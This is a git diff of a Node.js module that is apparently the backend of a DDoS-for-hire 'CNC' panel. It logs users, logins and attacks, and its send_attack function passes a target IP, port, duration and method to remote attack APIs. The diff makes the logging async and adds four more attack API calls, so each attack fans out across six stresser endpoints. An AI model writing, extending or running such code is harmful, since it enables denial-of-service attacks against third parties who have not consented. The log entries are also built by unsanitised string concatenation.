@@ -1,6 +1,7 @@
 // Modules 
 const fs = require("fs");
 const fetch = require("node-fetch");
+const moment = require("moment");
 
 // File
 const eExtra = require("./functions.js");
@@ -27,7 +28,7 @@ exports.log_action = async function(log_type, user, ip) {
     let get_user = Crud.User(user);
     let info = get_user.split(",");
 
-    let response = "[LOG]: " + log_type + " | [Timestamp]: " + eExtra.currentTime() + "\r\n";
+    let response = "[LOG]: " + log_type + " | [Timestamp]: " + await eExtra.currentTime() + "\r\n";
     response += "[User]: " + user + " | [IP]: " + ip + "\r\n";
     response += "[Level]: " + info[3] + " | [Admin]: " + info[5] + "\r\n";
     response += "[Cmd]: " + eConfig.CurrentCmd.Cmd + " | [FullCmd]: " + eConfig.CurrentCmd.Fullcmd + "\r\n\r\n";
@@ -44,12 +45,12 @@ exports.log_to_file = function(output) {
     fs.appendFileSync("./CNC/db/sys/logs.db", output);
 }
 
-exports.log_attack = function(user, ip, port, time, method) {
-    fs.appendFileSync("./CNC/db/sys/users.db", "('" + user + "','" + ip + "','" + port + "','" + time + "','" + method + "','" + this.currentTime() + "')\n");
+exports.log_attack = async function(user, ip, port, time, method) {
+    fs.appendFileSync("./CNC/db/sys/users.db", "('" + user + "','" + ip + "','" + port + "','" + time + "','" + method + "','" + await this.currentTime() + "')\n");
 }
 
-exports.log_login = function(user, ip) {
-    let t = this.currentTime();
+exports.log_login = async function(user, ip) {
+    let t = await this.currentTime();
     fs.appendFileSync("./CNC/db/sys/login_logs.db", "('" + user + "','" + ip + "','" + t + "')\n");
 }
 
@@ -82,10 +83,10 @@ exports.pScan = async function(ip) {
 *@type: void
 */
 exports.currentTime = async function() {
-    // let gangshit = await(await fetch("https://traumatized.tech/time.php")).text();
-    // return gangshit;
-
-    return "Current Disabled!";
+    var moment = require('moment-timezone');
+    var endTime = await moment().tz('America/New_York').toDate();
+    
+    return endTime;
 }
 
 /*
@@ -142,6 +143,22 @@ exports.send_attack = async function(ip, port, time, method, usr) {
     let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
     console.log(rreturn1);
     response += "API 2: " + await eExtra.get_api_response(rreturn1) + "\r\n";
+
+    let rreturn2 = await(await fetch(Config.API_3 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn2);
+    response += "API 3: " + await eExtra.get_api_response(rreturn2) + "\r\n";
+    
+    let rreturn3 = await(await fetch(Config.API_4 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn3);
+    response += "API 4: " + await eExtra.get_api_response(rreturn3) + "\r\n";
+    
+    let rreturn4 = await(await fetch(Config.API_5 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn4);
+    response += "API 5: " + await eExtra.get_api_response(rreturn4) + "\r\n";
+    
+    let rreturn5 = await(await fetch(Config.API_6 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn5);
+    response += "API 6: " + await eExtra.get_api_response(rreturn5) + "\r\n";
 
     return response;
 }
